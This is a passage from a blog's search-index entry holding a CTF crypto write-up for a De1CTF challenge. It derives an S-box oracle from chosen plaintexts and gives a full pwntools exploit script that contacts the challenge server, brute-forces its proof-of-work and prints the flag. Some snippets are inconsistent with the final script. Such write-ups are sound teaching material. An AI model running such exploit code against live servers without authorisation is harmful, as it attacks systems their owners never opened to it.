Sbox(x) = S0 = D0</code> now in the equation of <code>S2</code> -&gt; <code>B0 ^ D0 ^ S1 =  B0</code> since <code>S0 == S1 == D0</code> and <code>B0 == m</code> now the value of <code>S2</code> is <code>Sbox(m)</code> the value we need, but for to do all this we need a pair of input and output values of <code>Sbox()</code> for that we can send 0 as message then the equations are like:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">S0  =   Sbox(   A0 ^ C0                 )   =   Sbox(   <span class="number">0</span>   )</span><br><span class="line">S1  =   Sbox(   B0 ^ C0 ^ D0 ^ S0       )   =   Sbox(   S0  )</span><br><span class="line">S2  =   Sbox(   B0 ^ D0 ^ S1            )   =   Sbox(   S1  )</span><br><span class="line">S3  =   Sbox(   A0 ^ B0 ^ C0 ^ S2       )   =   Sbox(   S2  )</span><br><span class="line">S4  =   Sbox(   A0 ^ C0 ^ S3            )   =   Sbox(   S3  )</span><br><span class="line">S5  =   Sbox(   B0 ^ C0 ^ D0 ^ S0 ^ S4  )   =   Sbox(   S4  )</span><br></pre></td></tr></table></figure><p>since we can recover <code>S2</code> and <code>S3</code> values and <code>S3 = Sbox(S2)</code> we have an input-output pair. let <code>x = S2</code> and <code>y = S3</code>, now we can craft our message such that we get the <code>Sbox(m)</code> of <code>m</code> we need, for that the msg will be <code>A0 = m, B0 = m, C0 = m ^ x, D0 = y</code> and by recovering <code>S2</code> from the ciphertext we get <code>Sbox(m)</code>.</p><h3 id="Sbox"><a href="#Sbox" class="headerlink" title="Sbox"></a>Sbox</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">SBox</span>(<span class="params">m</span>):</span><br><span class="line">    x = inp = <span class="number">3452694591</span>    <span class="comment"># hardcoded the values</span></span><br><span class="line">    y = out = <span class="number">2745719712</span></span><br><span class="line">    A0 = m</span><br><span class="line">    B0 = m</span><br><span class="line">    C0 = m ^ x</span><br><span class="line">    D0 = y</span><br><span class="line">    pt = list2hex([A0, B0, C0, D0])</span><br><span class="line">    <span class="comment"># encrypt here</span></span><br><span class="line">    ct = encrypt(pt)</span><br><span class="line">    A6, B6, C6, D6 = hex2list(ct)</span><br><span class="line">    s2 = C6 ^ B0 ^ A0 ^ C0 ^ B6 ^ D6  <span class="comment"># Read the really long hypothesis</span></span><br><span class="line">    <span class="keyword">return</span> s2   <span class="comment"># Sbox(m)</span></span><br></pre></td></tr></table></figure><p>now we officially have an oracle which gives the output of <code>Sbox()</code>, and all we need is to get all the 5 <code>S</code> values to recover the <code>secret</code>.</p><h3 id="Recovering-Sbox-Values"><a href="#Recovering-Sbox-Values" class="headerlink" title="Recovering Sbox - Values"></a>Recovering Sbox - Values</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">start = io.recvuntil(<span class="string">&#x27;): &#x27;</span>)</span><br><span class="line">secret = res.search(start).group()</span><br><span class="line">A6, B6, C6, D6 = hex2list(secret)</span><br><span class="line">m1 = B6 ^ D6</span><br><span class="line">m2 = B6 ^ D6 ^ C6</span><br><span class="line">m3 = C6 ^ A6 ^ B6</span><br><span class="line"></span><br><span class="line">S4 = SBox(m1)</span><br><span class="line">S3 = SBox(m2)</span><br><span class="line">S5 = SBox(m3)</span><br><span class="line"></span><br><span class="line">m4 = C6 ^ A6 ^ S6</span><br><span class="line">m5 = B6 ^ D6 ^ S4</span><br><span class="line"></span><br><span class="line">S0 = SBox(m5)</span><br><span class="line">S2 = SBox(m4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#m6 = B6 ^ C6 ^ D6 ^ S0</span></span><br><span class="line">m6 = C6 ^ A6 ^ B6 ^ S5</span><br><span class="line">S1 = SBox(m6)</span><br></pre></td></tr></table></figure><p>now we have the required values to recover plaintext.</p><h3 id="Recovering-Secret"><a href="#Recovering-Secret" class="headerlink" title="Recovering Secret"></a>Recovering Secret</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tab6 = &#123;</span><br><span class="line">    <span class="string">&#x27;A6&#x27;</span>: [<span class="string">&#x27;D0&#x27;</span>, <span class="string">&#x27;S1&#x27;</span>, <span class="string">&#x27;S2&#x27;</span>, <span class="string">&#x27;S3&#x27;</span>, <span class="string">&#x27;S5&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;B6&#x27;</span>: [<span class="string">&#x27;C0&#x27;</span>, <span class="string">&#x27;S0&#x27;</span>, <span class="string">&#x27;S1&#x27;</span>, <span class="string">&#x27;S4&#x27;</span>, <span class="string">&#x27;S5&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;C6&#x27;</span>: [<span class="string">&#x27;B0&#x27;</span>, <span class="string">&#x27;S2&#x27;</span>, <span class="string">&#x27;B3&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;D6&#x27;</span>: [<span class="string">&#x27;A0&#x27;</span>, <span class="string">&#x27;S0&#x27;</span>, <span class="string">&#x27;S1&#x27;</span>, <span class="string">&#x27;S3&#x27;</span>, <span class="string">&#x27;S4&#x27;</span>, <span class="string">&#x27;S5&#x27;</span>]</span><br><span class="line"></span><br><span class="line">A0 = B0 = C0 = D0 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> op <span class="keyword">in</span> tab0.keys():</span><br><span class="line">    <span class="built_in">exec</span>(op+<span class="string">&#x27; = &#x27;</span>+<span class="string">&#x27; ^ &#x27;</span>.join(tab0[op]))</span><br><span class="line"><span class="built_in">print</span> list2hex([A0, B0, C0, D0])</span><br></pre></td></tr></table></figure><p>sending this <code>secret</code> to server gives us the flag.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><pre><code>- the variable names in the exploit are a bit different!!!</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> bruteforce</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">res = re.<span class="built_in">compile</span>(<span class="string">r&#x27;[a-z0-9]&#123;32&#125;&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;45.32.100.6&#x27;</span>, <span class="number">8003</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;localhost&#x27;, 8003)</span></span><br><span class="line">cookie, <span class="built_in">hash</span> = io.recvline().strip().split(<span class="string">&#x27; == &#x27;</span>)</span><br><span class="line">cookie = cookie.split(<span class="string">&#x27;XXXX+&#x27;</span>)[<span class="number">1</span>][:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force</span>(<span class="params"><span class="built_in">hash</span>, s</span>):</span><br><span class="line">    <span class="keyword">return</span> bruteforce(<span class="keyword">lambda</span> x: sha256(x+s).hexdigest() == <span class="built_in">hash</span>, string.  digits+string.ascii_letters, length=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(brute_force(<span class="built_in">hash</span>, cookie))</span><br><span class="line"><span class="comment"># POC till here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def gen(n):</span></span><br><span class="line"><span class="comment">#     sub = &#123;</span></span><br><span class="line"><span class="comment">#             &quot;S&#123;&#125;&quot;.format(n+1):[&quot;S&#123;&#125;&quot;.format(n+1)],</span></span><br><span class="line"><span class="comment">#             &quot;A&#123;&#125;&quot;.format(n):&quot;A&#123;&#125; B&#123;&#125; S&#123;&#125;&quot;.format(n-1,n-1,n).split(),</span></span><br><span class="line"><span class="comment">#             &quot;B&#123;&#125;&quot;.format(n):&quot;A&#123;&#125; B&#123;&#125; D&#123;&#125; S&#123;&#125;&quot;.format(n-1,n-1,n-1,n).split(),</span></span><br><span class="line"><span class="comment">#             &quot;C&#123;&#125;&quot;.format(n):&quot;A&#123;&#125; C&#123;&#125; D&#123;&#125;&quot;.format(n-1,n-1,n-1).split(),</span></span><br><span class="line"><span class="comment">#             &quot;D&#123;&#125;&quot;.format(n):&quot;C&#123;&#125; D&#123;&#125; S&#123;&#125;&quot;.format(n-1,n-1,n).split(),</span></span><br><span class="line"><span class="comment">#     &#125;</span></span><br><span class="line"><span class="comment">#     if n==0:</span></span><br><span class="line"><span class="comment">#         sub = &#123;</span></span><br><span class="line"><span class="comment">#                 &quot;S1&quot;:[&#x27;S1&#x27;],</span></span><br><span class="line"><span class="comment">#                 &quot;A0&quot;:[&#x27;A0&#x27;],</span></span><br><span class="line"><span class="comment">#                 &quot;B0&quot;:[&#x27;B0&#x27;],</span></span><br><span class="line"><span class="comment">#                 &quot;C0&quot;:[&#x27;C0&#x27;],</span></span><br><span class="line"><span class="comment">#                 &quot;D0&quot;:[&#x27;D0&#x27;],</span></span><br><span class="line"><span class="comment">#                 &#125;</span></span><br><span class="line"><span class="comment">#     return sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chars = &quot;ABCD&quot;</span></span><br><span class="line"><span class="comment"># def parser(n):</span></span><br><span class="line"><span class="comment">#     def gf(l):</span></span><br><span class="line"><span class="comment">#         re = []</span></span><br><span class="line"><span class="comment">#         s = set(l)</span></span><br><span class="line"><span class="comment">#         for op in s:</span></span><br><span class="line"><span class="comment">#             if l.count(op)%2!=0:</span></span><br><span class="line"><span class="comment">#                 re.append(op)</span></span><br><span class="line"><span class="comment">#         return re</span></span><br><span class="line"><span class="comment">#     game = n</span></span><br><span class="line"><span class="comment">#     subn = gen(n)</span></span><br><span class="line"><span class="comment">#     while(n&gt;0):</span></span><br><span class="line"><span class="comment">#         subm = gen(n-1)</span></span><br><span class="line"><span class="comment">#         for c in chars:</span></span><br><span class="line"><span class="comment">#             k = c+str(game)</span></span><br><span class="line"><span class="comment">#             currents = subn[k][:]</span></span><br><span class="line"><span class="comment">#             for op in currents:</span></span><br><span class="line"><span class="comment">#                 if op[0] == &#x27;S&#x27;: continue</span></span><br><span class="line"><span class="comment">#                 subn[k].remove(op)</span></span><br><span class="line"><span class="comment">#                 subn[k] = subn[k]+subm[op]</span></span><br><span class="line"><span class="comment">#         n-=1</span></span><br><span class="line"><span class="comment">#     for c in chars:</span></span><br><span class="line"><span class="comment">#         k = c+str(game)</span></span><br><span class="line"><span class="comment">#         check = subn[k][:]</span></span><br><span class="line"><span class="comment">#         subn[k] = gf(check)</span></span><br><span class="line"><span class="comment">#     return subn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    pad_length = <span class="number">8</span>-<span class="built_in">len</span>(x)</span><br><span class="line">    <span class="keyword">return</span> pad_length*<span class="string">&#x27;0&#x27;</span>+x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex2list</span>(<span class="params">x</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>, <span class="number">8</span>):</span><br><span class="line">        r = x[i:i+<span class="number">8</span>]</span><br><span class="line">        res.append(<span class="built_in">int</span>(r, <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list2hex</span>(<span class="params">x</span>):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        res += pad(<span class="built_in">hex</span>(x[i])[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def check(inp, out):</span></span><br><span class="line"><span class="comment">#     a0,b0,c0,d0 = hex2list(inp)</span></span><br><span class="line"><span class="comment">#     a6,b6,c6,d6 = hex2list(out)</span></span><br><span class="line"><span class="comment">#     s4 = b6 ^ d6 ^ a0 ^ c0</span></span><br><span class="line"><span class="comment">#     s3 = c6 ^ b0 ^ s4</span></span><br><span class="line"><span class="comment">#     print s3, s4</span></span><br><span class="line"><span class="comment">#     print a0 ^ b0 ^ c0 ^ s3, s4</span></span><br><span class="line"><span class="comment">#     return a0 ^ b0 ^ c0 ^ s3, s4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># local</span></span><br><span class="line">x = inp = <span class="number">0</span></span><br><span class="line">y = out = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">x = inp = <span class="number">3452694591</span></span><br><span class="line">y = out = <span class="number">2745719712</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Table of [ABCD6]</span></span><br><span class="line"><span class="comment"># tab6 = parser(6)</span></span><br><span class="line">tab6 = &#123;</span><br><span class="line">    <span class="string">&#x27;A6&#x27;</span>: [<span class="string">&#x27;S2&#x27;</span>, <span class="string">&#x27;S1&#x27;</span>, <span class="string">&#x27;S5&#x27;</span>, <span class="string">&#x27;S3&#x27;</span>, <span class="string">&#x27;D0&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;B6&#x27;</span>: [<span class="string">&#x27;S0&#x27;</span>, <span class="string">&#x27;S1&#x27;</span>, <span class="string">&#x27;S4&#x27;</span>, <span class="string">&#x27;S5&#x27;</span>, <span class="string">&#x27;C0&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;C6&#x27;</span>: [<span class="string">&#x27;S2&#x27;</span>, <span class="string">&#x27;S3&#x27;</span>, <span class="string">&#x27;B0&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;D6&#x27;</span>: [<span class="string">&#x27;S3&#x27;</span>, <span class="string">&#x27;S1&#x27;</span>, <span class="string">&#x27;S0&#x27;</span>, <span class="string">&#x27;S5&#x27;</span>, <span class="string">&#x27;S4&#x27;</span>, <span class="string">&#x27;A0&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Table of [ABCD]0</span></span><br><span class="line">tab0 = &#123;</span><br><span class="line">    <span class="string">&#x27;D0&#x27;</span>: [<span class="string">&#x27;S3&#x27;</span>, <span class="string">&#x27;S2&#x27;</span>, <span class="string">&#x27;S6&#x27;</span>, <span class="string">&#x27;S4&#x27;</span>, <span class="string">&#x27;A6&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;C0&#x27;</span>: [<span class="string">&#x27;S2&#x27;</span>, <span class="string">&#x27;S1&#x27;</span>, <span class="string">&#x27;S6&#x27;</span>, <span class="string">&#x27;S5&#x27;</span>, <span class="string">&#x27;B6&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;B0&#x27;</span>: [<span class="string">&#x27;S3&#x27;</span>, <span class="string">&#x27;S4&#x27;</span>, <span class="string">&#x27;C6&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;A0&#x27;</span>: [<span class="string">&#x27;S2&#x27;</span>, <span class="string">&#x27;S1&#x27;</span>, <span class="string">&#x27;S6&#x27;</span>, <span class="string">&#x27;S5&#x27;</span>, <span class="string">&#x27;S4&#x27;</span>, <span class="string">&#x27;D6&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sn based on 6&#x27;s</span></span><br><span class="line"><span class="comment">## S1 = f(S4 ^ B6 ^ D6)</span></span><br><span class="line">tabSn6 = &#123;</span><br><span class="line">    <span class="string">&#x27;S1&#x27;</span>: [<span class="string">&#x27;S4&#x27;</span>, <span class="string">&#x27;B6&#x27;</span>, <span class="string">&#x27;D6&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;S2&#x27;</span>: [<span class="string">&#x27;S5&#x27;</span>, <span class="string">&#x27;A6&#x27;</span>, <span class="string">&#x27;B6&#x27;</span>, <span class="string">&#x27;C6&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;S3&#x27;</span>: [<span class="string">&#x27;C6&#x27;</span>, <span class="string">&#x27;A6&#x27;</span>, <span class="string">&#x27;S6&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;S4&#x27;</span>: [<span class="string">&#x27;B6&#x27;</span>, <span class="string">&#x27;C6&#x27;</span>, <span class="string">&#x27;D6&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;S5&#x27;</span>: [<span class="string">&#x27;B6&#x27;</span>, <span class="string">&#x27;D6&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;S6&#x27;</span>: [<span class="string">&#x27;A6&#x27;</span>, <span class="string">&#x27;B6&#x27;</span>, <span class="string">&#x27;C6&#x27;</span>],</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sn based on 0&#x27;s</span></span><br><span class="line"><span class="comment">## S1 = f(a0 ^ c0)</span></span><br><span class="line">tabSn0 = &#123;</span><br><span class="line">    <span class="string">&#x27;S1&#x27;</span>: [<span class="string">&#x27;A0&#x27;</span>, <span class="string">&#x27;C0&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;S2&#x27;</span>: [<span class="string">&#x27;B0&#x27;</span>, <span class="string">&#x27;C0&#x27;</span>, <span class="string">&#x27;D0&#x27;</span>, <span class="string">&#x27;S1&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;S3&#x27;</span>: [<span class="string">&#x27;B0&#x27;</span>, <span class="string">&#x27;D0&#x27;</span>, <span class="string">&#x27;S2&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;S4&#x27;</span>: [<span class="string">&#x27;A0&#x27;</span>, <span class="string">&#x27;B0&#x27;</span>, <span class="string">&#x27;C0&#x27;</span>, <span class="string">&#x27;S3&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;S5&#x27;</span>: [<span class="string">&#x27;A0&#x27;</span>, <span class="string">&#x27;C0&#x27;</span>, <span class="string">&#x27;S4&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;S6&#x27;</span>: [<span class="string">&#x27;B0&#x27;</span>, <span class="string">&#x27;C0&#x27;</span>, <span class="string">&#x27;D0&#x27;</span>, <span class="string">&#x27;S1&#x27;</span>, <span class="string">&#x27;S5&#x27;</span>],</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">pt, io=io</span>):</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> io.can_recv():</span><br><span class="line">        io.recv()</span><br><span class="line">    io.sendline(pt)</span><br><span class="line">    <span class="comment">#out = io.recv().splitlines()[0].split()[-1]</span></span><br><span class="line">    out = io.recv()</span><br><span class="line">    out = res.search(out).group()</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># function to find f(m)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SBox</span>(<span class="params">m</span>):</span><br><span class="line">    A0 = m</span><br><span class="line">    B0 = m</span><br><span class="line">    C0 = m ^ x</span><br><span class="line">    D0 = y</span><br><span class="line">    pt = list2hex([A0, B0, C0, D0])</span><br><span class="line">    <span class="comment"># encrypt here</span></span><br><span class="line">    ct = encrypt(pt)</span><br><span class="line">    A6, B6, C6, D6 = hex2list(ct)</span><br><span class="line">    s3 = C6 ^ B0 ^ A0 ^ C0 ^ B6 ^ D6  <span class="comment"># Read the really long hypothesis</span></span><br><span class="line">    <span class="keyword">return</span> s3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># main function</span></span><br><span class="line"><span class="comment"># io.recv() # localonly</span></span><br><span class="line">start = io.recvuntil(<span class="string">&#x27;): &#x27;</span>)</span><br><span class="line">secret = res.search(start).group()</span><br><span class="line">A6, B6, C6, D6 = hex2list(secret)</span><br><span class="line">m1 = B6 ^ D6</span><br><span class="line">m2 = B6 ^ D6 ^ C6</span><br><span class="line">m3 = C6 ^ A6 ^ B6</span><br><span class="line"></span><br><span class="line">S5 = SBox(m1)</span><br><span class="line">S4 = SBox(m2)</span><br><span class="line">S6 = SBox(m3)</span><br><span class="line"></span><br><span class="line">m4 = C6 ^ A6 ^ S6</span><br><span class="line">m5 = B6 ^ D6 ^ S4</span><br><span class="line"></span><br><span class="line">S1 = SBox(m5)</span><br><span class="line">S3 = SBox(m4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#m6 = B6 ^ C6 ^ D6 ^ S1</span></span><br><span class="line">m6 = C6 ^ A6 ^ B6 ^ S5</span><br><span class="line">S2 = SBox(m6)</span><br><span class="line"></span><br><span class="line">A0 = B0 = C0 = D0 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> op <span class="keyword">in</span> tab0.keys():</span><br><span class="line">    <span class="built_in">exec</span>(op+<span class="string">&#x27; = &#x27;</span>+<span class="string">&#x27; ^ &#x27;</span>.join(tab0[op]))</span><br><span class="line"><span class="built_in">print</span> list2hex([A0, B0, C0, D0])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># de1ctf&#123;12759ff07f5f8145dfd661cb0f35e1a4&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><blockquote><p>de1ctf{12759ff07f5f8145dfd661cb0f35e1a4}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> crypto </tag>
            
            <tag> sbox </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
